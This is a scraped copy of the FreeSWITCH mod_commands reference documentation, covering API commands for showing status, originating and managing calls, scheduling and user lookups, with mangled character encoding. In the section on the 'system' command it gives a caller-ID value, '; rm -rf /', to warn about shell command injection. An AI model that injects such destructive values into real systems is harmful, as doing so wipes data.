|Â calls [count] |Â channels [count|like ] |Â chat |Â codec |Â complete |Â detailed_bridged_calls |Â detailed_calls |Â dialplan |Â endpoint |Â file |Â interface_types |Â interfaces |Â limitsÂ management |Â modules |Â nat_map |registrations |Â say |Â tasks |Â timer |Â ] [as xml|as delim ]XML formatted:show foo as xmlChange delimiter:show foo as delim |\naliasesÂ â€“ list defined command aliases apiÂ â€“ list API commands exposed by loadable modules applicationÂ â€“ list applications exposed by loadable modules, notably mod_dptools bridged_callsÂ â€“ deprecated, use \u0026ldquo;show calls\u0026rdquo; callsÂ [count] â€“ list details of currently active calls; the keyword \u0026ldquo;count\u0026rdquo; eliminates the details and only prints the total count of calls channelsÂ [count|like ] â€“ list current channels; see Channels vs Calls countÂ â€“ show only the count of active channels, no details like â€“ filter results to include only channels that contain in uuid, channel name, cid_number, cid_name, presence data fields. chatÂ â€“ list chat interfaces codec â€“ list codecs that are currently loaded in FreeSWITCH completeÂ â€“ list command argument completion tables detailed_bridged_callsÂ â€“ same as \u0026ldquo;show detailed_calls\u0026rdquo; detailed_callsÂ â€“ like \u0026ldquo;show calls\u0026rdquo; but with more fields dialplanÂ â€“ list dialplan interfaces endpointÂ â€“ list endpoint interfaces currently available to FS fileÂ â€“ list supported file format interfaces interface_typesÂ â€“ list all interface types with a summary count of each type of interface available interfacesÂ â€“ enumerate all available interfaces by type, showing the module which exposes each interface limits â€“ list database limit interfaces management â€“ list management interfaces module â€“ enumerate modules and the path to each nat_mapÂ â€“ list Network Address Translation map registrationsÂ â€“ enumerate user extension registrations sayÂ â€“ enumerate available TTS (text-to-speech) interface modules with language supported tasksÂ â€“ list FS tasks timerÂ â€“ list timer modules Tips For Showing Calls and Channels The best way to get an understanding of all of the show calls/channels is to use them and observe the results. To display more fields:\nshow detailed_calls show bridged_calls show detailed_bridged_calls These three take the expand on information shown by \u0026ldquo;show calls\u0026rdquo;. Note that \u0026ldquo;show detailed_calls\u0026rdquo; replaces \u0026ldquo;show distinct_channels\u0026rdquo;. It provides similar, but more detailed, information. Also note that there is no \u0026ldquo;show detailed_channels\u0026rdquo; command, however using \u0026ldquo;show detailed_calls\u0026rdquo; will yield the same net result: FreeSWITCH lists detailed information about one-legged calls and bridged calls by using \u0026ldquo;show detailed_calls\u0026rdquo;, which can be quite useful while configuring and troubleshooting FS.Filtering ResultsTo filter only channels matching a specific uuid or related to a specific call, set the presence_data channel variable in the bridge or originate application to a unique string. Then you can use:show channels like footo list only those channels of interest. The like directive filters on these fields:\nuuid channel name caller id name caller id number presence_data NOTE: presence_data must be set during bridge or originate and not after the channel is established. shutdown Stop the FreeSWITCH program.Usage: shutdownThis only works from the console. To shutdown FS from an API call or fs_cli, you should use \u0026ldquo;fsctl shutdown\u0026rdquo; which offers a number of options.Shutdown from the console ignores arguments and exits immediately!\nstatus Show current FS status. Very helpful information to provide when asking questions on the mailing list or irc channel.Usage: statusfreeswitch@internal\u0026gt; statusUP 17 years, 20 days, 10 hours, 10 minutes, 31 seconds, 571 milliseconds, 721 microsecondsFreeSWITCH (Version 1.5.8b git 87751f9 2013-12-13 18:13:56Z 32bit) is ready 53987253 session(s) since startup 127 session(s) - peak 127, last 5min 253 55 session(s) per Sec out of max 60, peak 55, last 5min 253 1000 session(s) max min idle cpu 0.00/97.71 strftime_tz Displays formatted time, converted to a specific timezone. See /usr/share/zoneinfo/zone.tab for the standard list of Linux timezones.Usage: strftime_tz [format_string]Example:strftime_tz US/EasternÂ %Y-%m-%dÂ %T unload Unload external module.Usage: unload \u0026lt;mod_name\u0026gt; version Show version of the switchUsage: version [short]Examples:freeswitch@internal\u0026gt; versionFreeSWITCH Version 1.5.8b+git~20131213T181356Z~87751f9eaf~32bit (git 87751f9 2013-12-13 18:13:56Z 32bit)freeswitch@internal\u0026gt; version short1.5.8b xml_locate Write active xml tree or specified branch to stdout.Usage: xml_locate [root | | \u0026lt;tag_attr_name\u0026gt; \u0026lt;tag_attr_val\u0026gt;]xml_locate root will return all XML being used by FreeSWITCHxml_locate : Will return the XML corresponding to the specified xml_locate directoryxml_locate configurationxml_locate dialplanxml_locate phrasesExample:xml_locate directory domain name example.comxml_locate configuration configuration name ivr.conf xml_wrap Wrap another API command in XML.Usage: xml_wrap Call Management Commands break Deprecated. See uuid_break. create_uuid Creates a new UUID and returns it as a string.Usage: create_uuid originate Originate a new call.Usageoriginate \u0026lt;call_url\u0026gt; |\u0026amp;\u0026lt;application_name\u0026gt;(\u0026lt;app_args\u0026gt;) [] [] [\u0026lt;cid_name\u0026gt;] [\u0026lt;cid_num\u0026gt;] [\u0026lt;timeout_sec\u0026gt;]\nFreeSWITCH will originate a call to \u0026lt;call_url\u0026gt; as Leg A. If that leg supervises within 60 seconds FS will continue by searching for an extension definition in the specified dialplan for or else execute the application that follows the \u0026amp; along with its arguments.Originate Arguments Arguments \u0026lt;call_url\u0026gt; URL you are calling. For more info on sofia SIP URL syntax see: FreeSwitch Endpoint Sofia Destination, one of: Destination number to search in dialplan; note that registered extensions will fail this way, use \u0026amp;bridge(user/xxxx) instead \u0026amp;\u0026lt;application_name\u0026gt;(\u0026lt;app_args\u0026gt;) \u0026ldquo;\u0026amp;\u0026rdquo; indicates what follows is an application name, not an exten (\u0026lt;app_args\u0026gt;) is optional (not all applications require parameters, e.g. park) The most commonly used application names include:park, bridge, javascript/lua/perl, playback (remove mod_native_file). Note: Use single quotes to pass arguments with spaces, e.g. \u0026lsquo;\u0026amp;lua(test.lua arg1 arg2)\u0026rsquo; Note: There is no space between \u0026amp; and the application name Defaults to \u0026lsquo;XML\u0026rsquo; if not specified. Defaults to \u0026lsquo;default\u0026rsquo; if not specified. \u0026lt;cid_name\u0026gt; CallerID name to send to Leg A. \u0026lt;cid_num\u0026gt; CallerID number to send to Leg A. \u0026lt;timeout_sec\u0026gt; Timeout in seconds; default = 60 seconds. Originate Variables Variables These variables can be prepended to the dial string inside curly braces and separated by commas. Example:originate {sip_auto_answer=true,return_ring_ready=false}user/1001 9198Variables within braces must be separated by a comma.\ngroup_confirm_key group_confirm_file forked_dial fail_on_single_reject ignore_early_media - must be defined on Leg B in bridge or originate command to stop remote ringback from being heard by Leg A return_ring_ready originate_retries originate_retry_sleep_ms origination_caller_id_name origination_caller_id_number originate_timeout sip_auto_answer Description of originate\u0026rsquo;s related variablesÂ Originate Examples Examples You can call a locally registered sip endpoint 300 and park the call like so Note that the \u0026ldquo;example\u0026rdquo; profile used here must be the one to which 300 is registered. Also note the use of % instead of @ to indicate that it is a registered extension.originate sofia/example/300%pbx.internal \u0026amp;park()Or you could instead connect a remote sip endpoint to extension 8600originate sofia/example/300@foo.com 8600Or you could instead connect a remote SIP endpoint to another remote extensionoriginate sofia/example/300@foo.com \u0026amp;bridge(sofia/example/400@bar.com)Or you could even run a Javascript application test.jsoriginate sofia/example/1000@somewhere.com \u0026amp;javascript(test.js)To run a javascript with arguments you must surround it in single quotes.originate sofia/example/1000@somewhere.com \u0026lsquo;\u0026amp;javascript(test.js myArg1 myArg2)\u0026rsquo;Setting channel variables to the dial stringoriginate {ignore_early_media=true}sofia/mydomain.com/18005551212@1.2.3.4 15555551212Setting SIP header variables to send to another FS box during originateoriginate {sip_h_X-varA=111,sip_h_X-varB=222}sofia/mydomain.com/18005551212@1.2.3.4 15555551212Note: you can set any channel variable, even custom ones. Use single quotes to enclose values with spaces, commas, etc.originate {my_own_var=my_value}sofia/mydomain.com/that.ext@1.2.3.4 15555551212originate {my_own_var=\u0026lsquo;my value'}sofia/mydomain.com/that.ext@1.2.3.4 15555551212If you need to fake the ringback to the originated endpoint try this:originate {ringback='%(2000,4000,440.0,480.0)'}sofia/example/300@foo.com \u0026amp;bridge(sofia/example/400@bar.com)To specify a parameter to the Leg A call and the Leg B bridge application:originate {\u0026lsquo;origination_caller_id_number=2024561000\u0026rsquo;}sofia/gateway/whitehouse.gov/2125551212 \u0026amp;bridge([\u0026rsquo;effective_caller_id_number=7036971379\u0026rsquo;]sofia/gateway/pentagon.gov/3035554499)\nIf you need to make originate return immediately when the channel is in \u0026ldquo;Ring-Ready\u0026rdquo; state try this:originate {return_ring_ready=true}sofia/gateway/someprovider/919246461929 \u0026amp;socket(\u0026lsquo;127.0.0.1:8082 async full\u0026rsquo;)More info on return_ring_readyYou can even set music on hold for the ringback if you want:originate {ringback='/path/to/music.wav'}sofia/gateway/name/number \u0026amp;bridge(sofia/gateway/siptoshore/12425553741)You can originate a call in the background (asynchronously) and playback a message with a 60 second timeout.bgapi originate {ignore_early_media=true,originate_timeout=60}sofia/gateway/name/number \u0026amp;playback(message)You can specify the UUID of an originated call by doing the following:\nUse create_uuid to generate a UUID to use. This will allow you to kill an originated call before it is answered by using uuid_kill. If you specify origination_uuid it will remain the UUID for the answered call leg for the whole session. originate {origination_uuid=...}user/100@domain.name.comHere\u0026rsquo;s an example of originating a call to the echo conference (an external sip URL) and bridging it to a local user\u0026rsquo;s phone:originate sofia/internal/9996@conference.freeswitch.org \u0026amp;bridge(user/105@default)Here\u0026rsquo;s an example of originating a call to an extension in a different context than \u0026lsquo;default\u0026rsquo; (required for the FreePBX which uses context_1, context_2, etc.):originate sofia/internal/2001@foo.com 3001 xml context_3You can also originate to multiple extensions as follows:originate user/1001,user/1002,user/1003 \u0026amp;park()To put an outbound call into a conference at early media, either of these will work (they are effectively the same thing)originate sofia/example/300@foo.com \u0026amp;conference(conf_uuid-TEST_CON)originate sofia/example/300@foo.com conference:conf_uuid-TEST_CON inlineSee mod_dptools: Inline Dialplan for more detail on \u0026lsquo;inline\u0026rsquo; DialplansAn example of using loopback and inline on the A-leg can be found in this mailing list postÂ pause Pause playback of recorded media that was started with uuid_broadcast.Usagepause \u0026lt;on|off\u0026gt;Turning pause \u0026ldquo;on\u0026rdquo; activates the pause function, i.e. it pauses the playback of recorded media. Turning pause \u0026ldquo;off\u0026rdquo; deactivates the pause function and resumes playback of recorded media at the same point where it was paused.Note: always returns -ERR no reply when successful; returns -ERR No such channel! when uuid is invalid. uuid_answer Answer a channelUsageuuid_answer See Also\nmod_dptools: answer uuid_audio Adjust the audio levels on a channel or mute (read/write) via a media bug.Usageuuid_audio [start [read|write] [[mute|level] ]|stop] is in the range from -4 to 4, 0 being the default value.Level is required for both mute|level params:freeswitch@internal\u0026gt; uuid_audio 0d7c3b93-a5ae-4964-9e4d-902bba50bd19 start write mute freeswitch@internal\u0026gt; uuid_audio 0d7c3b93-a5ae-4964-9e4d-902bba50bd19 start write level (This command behaves funky. Requires further testing to vet all arguments. - JB)See Also\nmod_dptools: set audio level uuid_break Break out of media being sent to a channel. For example, if an audio file is being played to a channel, issuing uuid_break will discontinue the media and the call will move on in the dialplan, script, or whatever is controlling the call.Usage: uuid_break [all]If the all flag is used then all audio files/prompts/etc. that are queued up to be played to the channel will be stopped and removed from the queue, otherwise only the currently playing media will be stopped. uuid_bridge Bridge two call legs together.Usageuuid_bridge \u0026lt;other_uuid\u0026gt;uuid_bridge needs at least any one leg to be in the answered state. If, for example, one channel is parked and another channel is actively conversing on a call, executing uuid_bridge on these 2 channels will drop the existing call and bridge together the specified channels. uuid_broadcast Execute an arbitrary dialplan application, typically playing a media file, on a specific uuid. If a filename is specified then it is played into the channel(s). To execute an application use \u0026ldquo;app::args\u0026rdquo; syntax.Usageuuid_broadcast [aleg|bleg|both]Execute an application on a chosen leg(s) with optional hangup afterwards:Usageuuid_broadcast app[![hangup_cause]]::args [aleg|bleg|both]Examples:Exampleuuid_broadcast 336889f2-1868-11de-81a9-3f4acc8e505e sorry.wav bothuuid_broadcast 336889f2-1868-11de-81a9-3f4acc8e505e say::en\\snumber\\spronounced\\s12345 aleguuid_broadcast 336889f2-1868-11de-81a9-3f4acc8e505e say!::en\\snumber\\spronounced\\s12345 aleguuid_broadcast 336889f2-1868-11de-81a9-3f4acc8e505e say!user_busy::en\\snumber\\spronounced\\s12345 aleguuid_broadcast 336889f2-1868-11de-81a9-3f4acc8e505e playback!user_busy::sorry.wav aleg uuid_buglist List the media bugs on channel. Output is formatted as XML.Usage\nuuid_buglist uuid_chat Send a chat message.Usageuuid_chat If the endpoint associated with the session has a receive_event handler, this message gets sent to that session and is interpreted as an instant message. uuid_debug_media Debug media, either audio or video.Usageuuid_debug_media \u0026lt;read|write|both|vread|vwrite|vboth\u0026gt; \u0026lt;on|off\u0026gt;Use \u0026ldquo;read\u0026rdquo; or \u0026ldquo;write\u0026rdquo; for the audio direction to debug, or \u0026ldquo;both\u0026rdquo; for both directions. And prefix with v for video media.uuid_debug_media emits a HUGE amount of data. If you invoke this command from fs_cli, be prepared.\nExample outputR sofia/internal/1003@192.168.65.3 b= 172 192.168.65.3:17668 192.168.65.114:16072 192.168.65.114:16072 pt=0 ts=2981605109 m=0W sofia/internal/1003@192.168.65.3 b= 172 192.168.65.3:17668 192.168.65.114:16072 192.168.65.114:16072 pt=0 ts=12212960 m=0R sofia/internal/1003@192.168.65.3 b= 172 192.168.65.3:17668 192.168.65.114:16072 192.168.65.114:16072 pt=0 ts=2981605269 m=0W sofia/internal/1003@192.168.65.3 b= 172 192.168.65.3:17668 192.168.65.114:16072 192.168.65.114:16072 pt=0 ts=12213120 m=0 Read Format \u0026ldquo;RÂ %s b=%4ldÂ %s:%uÂ %s:%uÂ %s:%u pt=%d ts=%u m=%d\\n\u0026rdquo;where the values are:\nswitch_channel_get_name(switch_core_session_get_channel(session)), (long) bytes, my_host, switch_sockaddr_get_port(rtp_session-\u0026gt;local_addr), old_host, rtp_session-\u0026gt;remote_port, tx_host, switch_sockaddr_get_port(rtp_session-\u0026gt;from_addr), rtp_session-\u0026gt;recv_msg.header.pt, ntohl(rtp_session-\u0026gt;recv_msg.header.ts), rtp_session-\u0026gt;recv_msg.header.m Write Format \u0026ldquo;WÂ %s b=%4ldÂ %s:%uÂ %s:%uÂ %s:%u pt=%d ts=%u m=%d\\n\u0026rdquo;where the values are:\nswitch_channel_get_name(switch_core_session_get_channel(session)), (long) bytes, my_host, switch_sockaddr_get_port(rtp_session-\u0026gt;local_addr), old_host, rtp_session-\u0026gt;remote_port, tx_host, switch_sockaddr_get_port(rtp_session-\u0026gt;from_addr), send_msg-\u0026gt;header.pt, ntohl(send_msg-\u0026gt;header.ts), send_msg-\u0026gt;header.m); uuid_deflect Deflect an answered SIP call off of FreeSWITCH by sending the REFER methodUsage: uuid_deflect uuid_deflect waits for the final response from the far end to be reported. It returns the sip fragment from that response as the text in the FreeSWITCH response to uuid_deflect. If the far end reports the REFER was successful, then FreeSWITCH will issue a bye on the channel.Exampleuuid_deflect 0c9520c4-58e7-40c4-b7e3-819d72a98614 sip:info@example.netResponse:Content-Type: api/responseContent-Length: 30+OK:SIP/2.0 486 Busy Here uuid_displace Displace the audio for the target with the specified audio .Usage: uuid_displace [start|stop] [] [mux]Arguments:\nuuid = Unique ID of this call (see \u0026lsquo;show channels\u0026rsquo;) start|stop = Start or stop this action file = path to an audio source (.wav file, shoutcast stream, etc\u0026hellip;) limit = limit number of seconds before terminating the displacement mux = multiplex; mix the original audio together with \u0026lsquo;file\u0026rsquo;, i.e. both parties can still converse while the file is playing (if the level is not too loud) To specify the 5th argument \u0026lsquo;mux\u0026rsquo; you must specify a limit; if no time limit is desired on playback, then specify 0.Examplescli\u0026gt; uuid_displace 1a152be6-2359-11dc-8f1e-4d36f239dfb5 start /sounds/test.wav 60cli\u0026gt; uuid_displace 1a152be6-2359-11dc-8f1e-4d36f239dfb5 stop /sounds/test.wav\nuuid_display Updates the display on a phone if the phone supports this. This works on some SIP phones right now including Polycom and Snom.Usage: name|numberNote the pipe character separating the Caller ID name and Caller ID number.This command makes the phone re-negotiate the codec. The SIP -\u0026gt; RTP Packet Size should be 0.020 seconds. If it is set to 0.030 on the Cisco SPA series phones it causes a DTMF lag. When DTMF keys are pressed on the phone they are can be seen on the fs_cli 4-6 seconds late.Example:freeswitch@sidious\u0026gt; uuid_display f4053af7-a3b9-4c78-93e1-74e529658573 Fred Jones|1001+OK Success\nuuid_dual_transfer Transfer each leg of a call to different destinations.Usage: [/][/] [/][/] uuid_dump Dumps all variable values for a session.Usage: uuid_dump [format]Format options: txt (default, may be omitted), XML, JSON, plain uuid_early_ok Stops the process of ignoring early media, i.e. if ignore_early_media=true, this stops ignoring early media coming from Leg B and responds normally.Usage: uuid_early_ok uuid_exists Checks whether a given UUID exists.Usage: uuid_exists Returns true or false. uuid_flush_dtmf Flush queued DTMF digitsUsage: uuid_flush_dtmf uuid_fileman Manage the audio being played into a channel from a sound fileUsage: uuid_fileman cmd:valCommands are:\nspeed:\u0026lt;+[step]\u0026gt;|\u0026lt;-[step]\u0026gt; volume:\u0026lt;+[step]\u0026gt;|\u0026lt;-[step]\u0026gt; pause (toggle) stop truncate restart seek:\u0026lt;+[milliseconds]\u0026gt;|\u0026lt;-[milliseconds]\u0026gt; (1000ms = 1 second, 10000ms = 10 seconds.) Example to seek forward 30 seconds:uuid_fileman 0171ded1-2c31-445a-bb19-c74c659b7d08 seek:+3000(Or use the current channel via ${uuid}, e.g. in a bind_digit_action)The \u0026lsquo;pause\u0026rsquo; argument is a toggle: the first time it is invoked it will pause playback, the second time it will resume playback. uuid_getvar Get a variable from a channel.Usage: uuid_getvar uuid_hold Place a channel on hold.Usage:uuid_hold place a call on holduuid_hold off switch off on holduuid_hold toggle toggles call-state based on current call-state uuid_kill Reset a specific channel.Usage: uuid_kill [cause]If no cause code is specified, NORMAL_CLEARING will be used. uuid_limit Apply or change limit(s) on a specified uuid.Usage: uuid_limit [[/interval]] [number [dialplan [context]]]See also mod_dptools: Limit uuid_media Reinvite FreeSWITCH out of the media path:Usage: uuid_media [off] Reinvite FreeSWITCH back in:Usage: uuid_media uuid_media_reneg Tell a channel to send a re-invite with optional list of new codecs to be renegotiated.Usage: uuid_media_reneg \u0026lt;=\u0026gt;Example: Adding =PCMU makes the offered codec string absolute. uuid_park Park callUsage: uuid_park The specified channel will be parked and the other leg of the call will be disconnected. uuid_pre_answer Preâ€“answer a channel.Usage: uuid_preanswer See Also: Misc._Dialplan_Tools_pre_answer uuid_preprocess Pre-process ChannelUsage: uuid_preprocess uuid_recv_dtmf Usage: uuid_recv_dtmfÂ \u0026lt;dtmf_data\u0026gt;\nuuid_send_dtmf Send DTMF digits to Usage: uuid_send_dtmf [@\u0026lt;tone_duration\u0026gt;]Use the character w for a .5 second delay and the character W for a 1 second delay.Default tone duration is 2000ms . uuid_send_info Send info to the endpointUsage: uuid_send_info uuid_session_heartbeat Usage: uuid_session_heartbeat [sched] [0|] uuid_setvar Set a variable on a channel. If value is omitted, the variable is unset.Usage: uuid_setvar [value] uuid_setvar_multi Set multiple vars on a channel.Usage: uuid_setvar_multi =[;=[;\u0026hellip;]] uuid_simplify This command directs FreeSWITCH to remove itself from the SIP signaling path if it can safely do so.Usage: uuid_simplify Execute this API command to instruct FreeSWITCHâ„¢ to inspect the Leg A and Leg B network addresses. If they are both hosted by the same switch as a result of a transfer or forwarding loop across a number of FreeSWITCHâ„¢ systems the one executing this command will remove itself from the SIP and media path and restore the endpoints to their local FreeSWITCHâ„¢ to shorten the network path. This is particularly useful in large distributed FreeSWITCHâ„¢ installations.For example, suppose a call arrives at a FreeSWITCHâ„¢ box in Los Angeles, is answered, then forwarded to a FreeSWITCHâ„¢ box in London, answered there and then forwarded back to Los Angeles. The London switch could execute uuid_simplify to tell its local switch to examine both legs of the call to determine that they could be hosted by the Los Angeles switch since both legs are local to it. Alternatively, setting sip_auto_simplify to true either globally in vars.xml or as part of a dailplan extension would tell FS to perform this check for each call when both legs supervise.Â uuid_transfer Transfers an existing call to a specific extension within a and . Dialplan may be \u0026ldquo;xml\u0026rdquo; or \u0026ldquo;directory\u0026rdquo;.Usageuuid_transfer [-bleg|-both] [] []\nThe optional first argument will allow you to transfer both parties (-both) or only the party to whom is talking.(-bleg). Beware that -bleg actually means \u0026ldquo;the other leg\u0026rdquo;, so when it is executed on the actual B leg uuid it will transfer the actual A leg that originated the call and disconnect the actual B leg.NOTE: if the call has been bridged, and you want to transfer either side of the call, then you will need to use (or the API equivalent). If it\u0026rsquo;s not set, transfer doesn\u0026rsquo;t really work as you\u0026rsquo;d expect, and leaves calls in limbo.And more examples seeÂ Inline Dialplan uuid_phone_event Send hold indication upstream:Usageuuid_phone_event hold|talk\nRecord/Playback Commands uuid_record Record the audio associated with the given UUID into a file. The start command causes FreeSWITCH to start mixing all call legs together and saves the result as a file in the format that the file\u0026rsquo;s extension dictates. (if available) The stop command will stop the recording and close the file. If media setup hasn\u0026rsquo;t yet happened, the file will contain silent audio until media is available. Audio will be recorded for calls that are parked. The recording will continue through the bridged call. If the call is set to return to park after the bridge, the bug will remain on the call, but no audio is recorded until the call is bridged again. (TODO: What if media doesn\u0026rsquo;t flow through FreeSWITCH? Will it re-INVITE first? Or do we just not get the audio in that case?)Usage:uuid_record [start|stop|mask|unmask] []Where limit is the max number of seconds to record.If the path is not specified on start it will default to the channel variable \u0026ldquo;sound_prefix\u0026rdquo; or FreeSWITCH base_dir when the \u0026ldquo;sound_prefix\u0026rdquo; is empty.You may also specify \u0026ldquo;all\u0026rdquo; for path when stop is used to remove all for this uuid\u0026ldquo;stop\u0026rdquo; command must be followed by option.\u0026ldquo;mask\u0026rdquo; will mask with silence part of the recording beginning when the mask argument is executed by this command. see http://jira.freeswitch.org/browse/FS-5269.\u0026ldquo;unmask\u0026rdquo; will stop the masking and continue recording live audio normally.See record\u0026rsquo;s related variablesyou will also want to see mod_dptools: record_session Limit Commands More information is available at Limit commands limit_reset Reset a limit backend. limit_status Retrieve status from a limit backend. limit_usage Retrieve usage for a given resource. uuid_limit_release Manually decrease a resource usage by one. limit_interval_reset Reset the interval counter to zero prior to the start of the next interval. Miscellaneous Commands bg_system Execute a system command in the background.Usage: bg_system echo Echo input back to the consoleUsage: echo Example:echo This text will appearThis text will appear file_exists Tests whether filename exists.file_exists filenameExamples:freeswitch\u0026gt; file_exists /tmp/real_filetrue\nfreeswitch\u0026gt; file_exists /tmp/missing_filefalseExample dialplan usage:file_exists example\nfile_exists tests whether FreeSWITCH can see the file, but the file may still be unreadable because of restrictive permissions.\nfind_user_xml Checks to see if a user exists. Matches user tags found in the directory, similar to user_exists, but returns an XML representation of the user as defined in the directory (like the one shown in user_exists).Usage: find_user_xml references a key specified in a directory\u0026rsquo;s user tag represents the value of the key is the domain to which the user is assigned. list_users Lists Users configured in DirectoryUsage:list_users [group ] [domain ] [user ] [context ]Examples:freeswitch@localhost\u0026gt; list_users group default\nuserid|context|domain|group|contact|callgroup|effective_caller_id_name|effective_caller_id_number2000|default|192.168.20.73|default|sofia/internal/sip:2000@192.168.20.219:5060|techsupport|B#-Test 2000|20002001|default|192.168.20.73|default|sofia/internal/sip:2001@192.168.20.150:63412;rinstance=8e2c8b86809acf2a|techsupport|Test 2001|20012002|default|192.168.20.73|default|error/user_not_registered|techsupport|Test 2002|20022003|default|192.168.20.73|default|sofia/internal/sip:2003@192.168.20.149:5060|techsupport|Test 2003|20032004|default|192.168.20.73|default|error/user_not_registered|techsupport|Test 2004|2004\n+OKSearch filters can be combined:freeswitch@localhost\u0026gt; list_users group default user 2004\nuserid|context|domain|group|contact|callgroup|effective_caller_id_name|effective_caller_id_number2004|default|192.168.20.73|default|error/user_not_registered|techsupport|Test 2004|2004\n+OK sched_api Schedule an API call in the future.Usage:sched_api [+@] \u0026lt;group_name\u0026gt; \u0026lt;command_string\u0026gt;[\u0026amp;] is the UNIX timestamp at which the command should be executed. If it is prefixed by +, specifies the number of seconds to wait before executing the command. If prefixed by @, it will execute the command periodically every seconds; for the first instance it will be executed after seconds.\u0026lt;group_name\u0026gt; will be the value of \u0026ldquo;Task-Group\u0026rdquo; in generated events. \u0026ldquo;none\u0026rdquo; is the proper value for no group. If set to UUID of channel (example: ${uuid}), task will automatically be unscheduled when channel hangs up.\u0026lt;command_string\u0026gt; is the command to execute at the scheduled time.A scheduled task or group of tasks can be revoked with sched_del or unsched_api.You could append the \u0026ldquo;\u0026amp;\u0026rdquo; symbol to the end of the line to executed this command in its own thread.Example:sched_api +1800 none originate sofia/internal/1000%${sip_profile} \u0026amp;echo()sched_api @600 check_sched log Periodic task is running\u0026hellip;sched_api +10 ${uuid} chat verto|fs@mydomain.com|1000@mydomain.com|Hello World sched_broadcast Play a file to a specific call in the future.Usage:sched_broadcast [[+]|@time] [aleg|bleg|both]Schedule execution of an application on a chosen leg(s) with optional hangup:sched_broadcast [+] app[![hangup_cause]]::args [aleg|bleg|both] is the UNIX timestamp at which the command should be executed. If it is prefixed by +, specifies the number of seconds to wait before executing the command. If prefixed by @, it will execute the command periodically every seconds; for the first instance it will be executed after seconds.Examples:sched_broadcast +60 336889f2-1868-11de-81a9-3f4acc8e505e commercial.wav bothsched_broadcast +60 336889f2-1868-11de-81a9-3f4acc8e505e say::en\\snumber\\spronounced\\s12345 aleg sched_del Removes a prior scheduled group or task IDUsage:sched_del \u0026lt;group_name|task_id\u0026gt;The one argument can either be a group of prior scheduled tasks or the returned task-id from sched_api.sched_transfer, sched_hangup and sched_broadcast commands add new tasks with group names equal to the channel UUID. Thus, sched_del with the channel UUID as the argument will remove all previously scheduled hangups, transfers and broadcasts for this channel.Examples:sched_del my_groupsched_del 2 sched_hangup Schedule a running call to hangup.Usage:sched_hangup [+] []sched_hangup +0 is the same as uuid_kill sched_transfer Schedule a transfer for a running call.Usage:sched_transfer [+] [] [] stun Executes a STUN lookup.Usage:stun [:port]Example:stun stun.freeswitch.org system Execute a system command.Usage:system The is passed to the system shell, where it may be expanded or interpreted in ways you don\u0026rsquo;t expect. This can lead to security bugs if you\u0026rsquo;re not careful. For example, the following command is dangerous:If a malicious remote caller somehow sets his caller ID name to \u0026ldquo;; rm -rf /\u0026rdquo; you would unintentionally be executing this shell command:log_caller_name; rm -rf /This would be a Bad Thing. time_test Runs a test to see how bad timer jitter is. It runs the test times if specified, otherwise it uses the default count of 10, and tries to sleep for mss microseconds. It returns the actual timer duration along with an average.Usage:time_test [count]Example:time_test 100 5\ntest 1 sleep 100 99test 2 sleep 100 97test 3 sleep 100 96test 4 sleep 100 97test 5 sleep 100 102avg 98 timer_test Runs a test to see how bad timer jitter is. Unlike time_test, this uses the actual FreeSWITCH timer infrastructure to do the timer test and exercises the timers used for call processing.Usage:timer_test \u0026lt;10|20|40|60|120\u0026gt; [\u0026lt;1..200\u0026gt;] [\u0026lt;timer_name\u0026gt;]The first argument is the timer interval.The second is the number of test iterations.The third is the timer name; \u0026ldquo;show timers\u0026rdquo; will give you a list.Example:timer_test 20 3\nAvg: 16.408ms Total Time: 49.269ms\n2010-01-29 12:01:15.504280 [CONSOLE] mod_commands.c:310 Timer Test: 1 sleep 20 92542010-01-29 12:01:15.524351 [CONSOLE] mod_commands.c:310 Timer Test: 2 sleep 20 200422010-01-29 12:01:15.544336 [CONSOLE] mod_commands.c:310 Timer Test: 3 sleep 20 19928 tone_detect Start Tone Detection on a channel.Usage:tone_detect \u0026lt;tone_spec\u0026gt; [ ] is required when this is executed as an api call; as a dialplan app the uuid is implicit as part of the channel variables is an arbitrary name that identifies this tone_detect instance; required\u0026lt;tone_spec\u0026gt; frequencies to detect; required \u0026lsquo;r\u0026rsquo; or \u0026lsquo;w\u0026rsquo; to specify which direction to monitor duration during which to detect tones;0 = detect forever+time = number of milliseconds after tone_detect is executedtime = absolute time to stop in seconds since The Epoch (1 January, 1970) FS application to execute when tone_detect is triggered; if app is omitted, only an event will be returned arguments to application enclosed in single quotes the number of times tone_detect should be triggered before executing the specified appOnce tone_detect returns a result, it will not trigger again until reset. Reset tone_detect by calling tone_detect with no additional arguments to reactivate the previously specified tone_detect declaration.See also http://wiki.freeswitch.org/wiki/Misc._Dialplan_Tools_tone_detect unsched_api Unschedule a previously scheduled API command.Usage:unsched_api \u0026lt;task_id\u0026gt; url_decode Usage:url_decode url_encode Url encode a string.Usage:url_encode user_data Retrieves user information (parameters or variables) as defined in the FreeSWITCH user directory.Usage:user_data @ \u0026lt;attr|var|param\u0026gt; is the user\u0026rsquo;s id is the user\u0026rsquo;s domain\u0026lt;attr|var|param\u0026gt; specifies whether the requested data is contained in the \u0026ldquo;variables\u0026rdquo; or \u0026ldquo;parameters\u0026rdquo; section of the user\u0026rsquo;s record is the name (key) of the variable to retrieveExamples:user_data 1000@192.168.1.101 param passwordwill return a result of 1234, anduser_data 1000@192.168.1.101 var accountcodewill return a result of 1000 from the example user shown in user_exists, anduser_data 1000@192.168.1.101 attr idwill return the user\u0026rsquo;s actual alphanumeric ID (i.e. \u0026ldquo;john\u0026rdquo;) when number-alias=\u0026ldquo;1000\u0026rdquo; was set as an attribute for that user. user_exists Checks to see if a user exists. Matches user tags found in the directory and returns either true/false:Usage:user_exists references a key specified in a directory\u0026rsquo;s user tag represents the value of the key is the domain to which the user belongsExample:user_exists id 1000 192.168.1.101will return true where there exists in the directory a user with a key called id whose value equals 1000:User Directory EntryIn the above example, we also could have tested for randomvar:user_exists randomvar 45 192.168.1.101And we would have received the same true result, but:user_exists accountcode 1000 192.168.1.101oruser_exists vm-password 1000 192.168.1.101Would have returned false.\n","permalink":"https://wdd.js.org/freeswitch/mod-command/","summary":"Usage CLI See below. API/Event Interfaces mod_event_socket mod_erlang_event mod_xml_rpc Scripting Interfaces mod_perl mod_v8 mod_python mod_lua From the Dialplan An API command can be called from the dialplan. Example:Invoke API Command From DialplanOther examples:Other Dialplan API Command ExamplesAPI commands with multiple arguments usually have the arguments separated by a space:Multiple Arguments\nDialplan UsageIf you are calling an API command from the dialplan make absolutely certain that there isn\u0026rsquo;t already a dialplan application that gives you the functionality you are looking for.","title":"mod_commands"},{"content":"The FreeSWITCH core configuration is contained inÂ autoload_configs/switch.conf.xml\nDefault key 